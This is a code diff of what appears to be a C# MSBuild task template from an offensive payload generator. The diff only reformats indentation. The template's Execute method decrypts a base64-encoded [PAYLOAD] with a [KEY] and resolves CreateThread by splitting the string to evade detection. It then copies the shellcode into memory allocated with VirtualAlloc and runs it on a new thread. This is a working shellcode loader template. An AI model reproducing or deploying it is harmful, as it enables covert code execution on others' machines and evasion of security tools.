@@ -50,24 +50,22 @@
 
 			public override bool Execute() {	
 							
-							byte[] VAR9 = {[KEY]};
-							string VAR7 = VAR60.VAR61("[PAYLOAD]");
-							byte[] VAR10 = Convert.FromBase64String(VAR7);
-							byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);
+				byte[] VAR9 = {[KEY]};
+				string VAR7 = VAR60.VAR61("[PAYLOAD]");
+				byte[] VAR10 = Convert.FromBase64String(VAR7);
+				byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);
 
-							IntPtr VAR33 = LoadLibrary("kernel32.dll");
-                					IntPtr VAR34 = GetProcAddress(VAR33, "Crea"+"t"+"eTh"+"read");
-               						VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));
-						
-							UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
-							Marshal.Copy(VAR11, 0, (IntPtr)(VAR42), VAR11.Length);
-							IntPtr VAR43 = IntPtr.Zero;
-							IntPtr VAR44 = IntPtr.Zero;
-							UInt32 VAR45 = 0;
-							VAR43 = VAR35(IntPtr.Zero, 0, (IntPtr)VAR42, VAR44, 0, ref VAR45);
-							WaitForSingleObject(VAR43, 0xFFFFFFFF);
-							return true;
-				}
+				IntPtr VAR33 = LoadLibrary("kernel32.dll");
+				IntPtr VAR34 = GetProcAddress(VAR33, "Crea"+"t"+"eTh"+"read");
+				VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));
+
+				UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
+				Marshal.Copy(VAR11, 0, (IntPtr)(VAR42), VAR11.Length);
+				IntPtr VAR43 = IntPtr.Zero;
+				IntPtr VAR44 = IntPtr.Zero;
+				UInt32 VAR45 = 0;
+				VAR43 = VAR35(IntPtr.Zero, 0, (IntPtr)VAR42, VAR44, 0, ref VAR45);
+				WaitForSingleObject(VAR43, 0xFFFFFFFF);
 				return true;
 			}
 		}
